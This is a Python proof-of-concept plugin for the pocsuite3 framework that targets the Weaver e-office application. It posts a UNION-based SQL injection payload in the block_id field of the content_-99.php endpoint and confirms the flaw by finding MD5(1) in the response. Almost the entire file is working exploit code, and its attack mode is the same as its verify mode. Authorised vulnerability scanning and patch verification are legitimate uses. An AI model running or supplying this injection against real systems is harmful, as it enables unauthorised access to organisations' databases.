#!/usr/bin/env python
# -*- coding: utf-8 -*-
from plugin.pocsuite3.api import Output, POCBase, register_poc, requests
from plugin.pocsuite3.thirdparty.eyeJo import parse_ip_port, make_verify_url


class TestPOC(POCBase):
    vulID = ''''''
    cveID = ''''''
    cnvdID = ''''''
    cnnvdID = ''''''
    version = ''''''
    author = ''''''
    vulDate = ''''''
    createDate = ''''''
    updateDate = ''''''
    name = '''泛微e-office_content_-99_sqli'''
    desc = ''''''
    solution = ''''''
    severity = '''high'''
    vulType = '''sql-inj'''
    taskType = '''app-vul'''
    references = ['''''']
    appName = '''泛微Eoffice'''
    appVersion = '''all'''
    appPowerLink = ''''''
    samples = ['''''']
    install_requires = ['''''']

    def _verify(self):
        self.url, ip, port = parse_ip_port(self.target, 80)
        result = {}
        verify_url = make_verify_url(self.url, "/general/new_mytable/content_list/content_-99.php?user_id=WV00000045&lang=cn", mod=0)
        data ={'block_id': '-1703 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x7e7e7e,MD5(1),0x7e7e7e),NULL,NULL,NULL,NULL,NULL,NULL-- TSag',
               'body_width': '1121',
               '_': ''}
        resp = requests.post(url=verify_url,data=data, verify=False, timeout=20)
        if b'c4ca4238a0b923820dcc509a6f75849b' in resp.content and resp.status_code == 200:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['url'] = verify_url
            result['VerifyInfo']['port'] = port
        return self.parse_attack(result)

    _attack = _verify

    def parse_attack(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet Nothing returned')

        return output


register_poc(TestPOC)
